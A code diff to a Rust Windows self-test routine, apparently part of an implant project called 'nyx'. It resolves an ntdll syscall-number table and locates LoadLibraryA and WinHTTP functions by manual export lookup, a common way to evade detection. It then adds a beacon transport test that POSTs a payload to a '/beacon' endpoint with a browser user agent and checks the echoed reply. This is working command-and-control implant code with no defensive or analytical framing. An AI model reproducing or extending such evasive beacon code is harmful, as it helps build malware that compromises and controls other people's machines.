@@ -103,7 +103,83 @@ pub unsafe extern "system" fn nyx_selftest() {
     };
     let table = ntdll.resolve_table_owned();
     let ssn_count = table.iter().filter(|(_, ssn)| *ssn != u32::MAX).count() as u32;
-    report_exit(exit_proc, 0x100 + ssn_count);
+    // (SSN count already proven == 0xA3D; now test transport.)
+    let _ = ssn_count;
+
+    // Transport test: POST a known payload to the local Python echo server
+    // (127.0.0.1:8443/beacon), which echoes the body back. Verify round-trip.
+    // Exit: 0xC01 = success (response matches sent bytes); 0xC00 = transport
+    // call failed; 0xC02 = response length mismatch.
+    let payload: [u8; 8] = [0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x02, 0x03, 0x04];
+    // Diagnostic transport test: inline the WinHTTP steps to pinpoint failure.
+    // 0xD00 = LoadLibraryA(winhttp) failed
+    // 0xD01 = WinHttpOpen failed
+    // 0xD02 = WinHttpConnect failed
+    // 0xD03 = WinHttpOpenRequest failed
+    // 0xD04 = WinHttpSendRequest failed
+    // 0xD05 = WinHttpReceiveResponse failed
+    // 0xD06 = query/read returned no data
+    // 0xD07 = SUCCESS, body matches
+    // 0xD08 = SUCCESS but body mismatch
+    // First: LoadLibraryA(winhttp.dll)
+    type LLA = unsafe extern "system" fn(*const u8) -> *mut core::ffi::c_void;
+    let lla_addr = crate::resolve::export_addr(b"kernel32.dll", b"LoadLibraryA");
+    if lla_addr.is_none() { report_exit(exit_proc, 0xD00); }
+    let lla: LLA = core::mem::transmute(lla_addr.unwrap());
+    let h = lla(b"winhttp.dll\0".as_ptr());
+    if h.is_null() { report_exit(exit_proc, 0xD00); }
+    // WinHttpOpen
+    type FOpen = unsafe extern "system" fn(*const u16, u32, *const u16, *const u16, u32) -> *mut core::ffi::c_void;
+    let wo = crate::resolve::export_addr(b"winhttp.dll", b"WinHttpOpen").unwrap();
+    let wo_fn: FOpen = core::mem::transmute(wo);
+    let ua: crate::heap::Vec<u16> = b"Mozilla/5.0".iter().map(|&b| b as u16).chain(core::iter::once(0)).collect();
+    let session = wo_fn(ua.as_ptr(), 0, core::ptr::null(), core::ptr::null(), 0);
+    if session.is_null() { report_exit(exit_proc, 0xD01); }
+    // WinHttpConnect
+    type FConn = unsafe extern "system" fn(*mut core::ffi::c_void, *const u16, u16, u32) -> *mut core::ffi::c_void;
+    let wc = crate::resolve::export_addr(b"winhttp.dll", b"WinHttpConnect").unwrap();
+    let wc_fn: FConn = core::mem::transmute(wc);
+    let host: crate::heap::Vec<u16> = b"127.0.0.1".iter().map(|&b| b as u16).chain(core::iter::once(0)).collect();
+    let conn = wc_fn(session, host.as_ptr(), 8443, 0);
+    if conn.is_null() { report_exit(exit_proc, 0xD02); }
+    // WinHttpOpenRequest
+    type FReq = unsafe extern "system" fn(*mut core::ffi::c_void, *const u16, *const u16, *const u16, *const u16, *const *const u16, u32, u32) -> *mut core::ffi::c_void;
+    let wor = crate::resolve::export_addr(b"winhttp.dll", b"WinHttpOpenRequest").unwrap();
+    let wor_fn: FReq = core::mem::transmute(wor);
+    let verb: crate::heap::Vec<u16> = b"POST".iter().map(|&b| b as u16).chain(core::iter::once(0)).collect();
+    let path: crate::heap::Vec<u16> = b"/beacon".iter().map(|&b| b as u16).chain(core::iter::once(0)).collect();
+    let req = wor_fn(conn, verb.as_ptr(), path.as_ptr(), core::ptr::null(), core::ptr::null(), core::ptr::null(), 0, 0);
+    if req.is_null() { report_exit(exit_proc, 0xD03); }
+    // WinHttpSendRequest
+    type FSend = unsafe extern "system" fn(*mut core::ffi::c_void, *const u8, u32, *const u8, u32, u32, usize) -> i32;
+    let wsr = crate::resolve::export_addr(b"winhttp.dll", b"WinHttpSendRequest").unwrap();
+    let wsr_fn: FSend = core::mem::transmute(wsr);
+    let payload: [u8; 8] = [0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x02, 0x03, 0x04];
+    let ok = wsr_fn(req, core::ptr::null(), 0, payload.as_ptr(), 8, 8, 0);
+    if ok == 0 { report_exit(exit_proc, 0xD04); }
+    // WinHttpReceiveResponse
+    type FRecv = unsafe extern "system" fn(*mut core::ffi::c_void, *const core::ffi::c_void) -> i32;
+    let wrr = crate::resolve::export_addr(b"winhttp.dll", b"WinHttpReceiveResponse").unwrap();
+    let wrr_fn: FRecv = core::mem::transmute(wrr);
+    if wrr_fn(req, core::ptr::null()) == 0 { report_exit(exit_proc, 0xD05); }
+    // Read data
+    type FQuery = unsafe extern "system" fn(*mut core::ffi::c_void, *mut u32) -> i32;
+    let wq = crate::resolve::export_addr(b"winhttp.dll", b"WinHttpQueryDataAvailable").unwrap();
+    let wq_fn: FQuery = core::mem::transmute(wq);
+    type FRead = unsafe extern "system" fn(*mut core::ffi::c_void, *mut u8, u32, *mut u32) -> i32;
+    let wr = crate::resolve::export_addr(b"winhttp.dll", b"WinHttpReadData").unwrap();
+    let wr_fn: FRead = core::mem::transmute(wr);
+    let mut avail: u32 = 0;
+    let rc = wq_fn(req, &mut avail);
+    if rc == 0 || avail == 0 { report_exit(exit_proc, 0xD06); }
+    let mut buf = crate::heap::vec![0u8; avail as usize];
+    let mut got: u32 = 0;
+    let rc2 = wr_fn(req, buf.as_mut_ptr(), avail, &mut got);
+    if rc2 == 0 || got == 0 { report_exit(exit_proc, 0xD06); }
+    if got as usize == payload.len() && buf[..got as usize] == payload[..] {
+        report_exit(exit_proc, 0xD07);
+    }
+    report_exit(exit_proc, 0xD08);
 }
 
 /// Resolve a function in a loaded module by (module name, function name).
